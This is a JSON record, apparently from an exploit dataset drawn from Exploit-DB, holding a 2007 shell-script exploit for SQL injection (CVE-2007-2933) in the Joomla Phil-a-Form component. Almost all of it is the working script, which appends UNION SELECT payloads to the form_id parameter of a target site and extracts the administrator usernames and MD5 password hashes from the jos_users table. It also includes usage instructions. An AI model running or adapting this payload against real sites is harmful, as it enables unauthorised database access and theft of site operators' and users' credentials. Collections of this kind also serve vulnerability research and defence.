{
  "id": "4003",
  "title": "Joomla! Component Phil-a-Form 1.2.0.0 - SQL Injection",
  "cve": "CVE-2007-2933",
  "vuln_type": "sqli",
  "code": "#!/bin/sh\r\n\r\n#################################################################################\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#    Joomla Component Phil-a-Form <= 1.2.0.0 SQL Injection Exploit\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Discovered by: Cody \"CypherXero\" Rester\t\t\t\t\t#\r\n# Payload: Admin Username and MD5 Hash Retrieval\t\t\t\t#\r\n# Website: http://www.cypherxero.net\t\t\t\t\t\t#\r\n# Shoutouts to the milw0rm community, the PIMP forums\t\t\t\t#\r\n# and my blog, of course  \t \t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#################################################################################\r\n\r\necho \"-------------------------------------------------------------------------\"\r\necho \"      Joomla Component Phil-a-Form <= 1.2.0.0 SQL Injection Exploit\"\r\necho \"-------------------------------------------------------------------------\"\r\necho \"Usage: sql_philaform_jos.sh [HOST] [FORM_ID]\"\r\necho \"[HOST] = Hostname of targetwebsite\"\r\necho \"[FORM_ID] = Form ID of Phil-a-Form post\"\r\necho \"e.g. sql_philaform_jos.sh http://www.targethost.com 2\"\r\necho \"-------------------------------------------------------------------------\"\r\necho \"                           Cody CypherXero Rester\"\r\necho \"            \t\t http://www.cypherxero.net\"\r\necho \"-------------------------------------------------------------------------\"\r\n\r\njos_username=\"%20UNION%20SELECT%20null,null,username,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20jos_users%20--\"\r\njos_password=\"%20UNION%20SELECT%20null,null,password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20jos_users%20--\"\r\nhost=\"$1\"\r\nform_id=\"$2\"\r\n\r\nif [ \"$form_id\" == \"\" ]\r\nthen\r\necho \"Syntax not correct! See usage example!\"\r\nexit 1\r\nelse\r\necho \"\"\r\nfi\r\n\r\necho \"Username\" > $host.txt\r\necho \"--------\" >> $host.txt\r\nlinks -dump \"http://$host/index.php?option=com_philaform&form_id=$form_id$jos_username\" | grep -i \"philaform_\" | awk -F\\_ '{ print $2 }' | awk '{ print $1 }' >> $host.txt\r\necho \" \" >> $host.txt\r\necho \"MD5 Password Hash\" >> $host.txt\r\necho \"-----------------\" >> $host.txt\r\nlinks -dump \"http://$host/index.php?option=com_philaform&form_id=$form_id$jos_password\" | grep -i \"philaform_\" | awk -F\\_ '{ print $2 }' | awk '{ print $1 }' >> $host.txt\r\n\r\necho \"\"\r\ncat $host.txt\r\n\r\nexit 0\r\n\r\n# milw0rm.com [2007-05-28]",
  "url": "https://www.exploit-db.com/exploits/4003"
}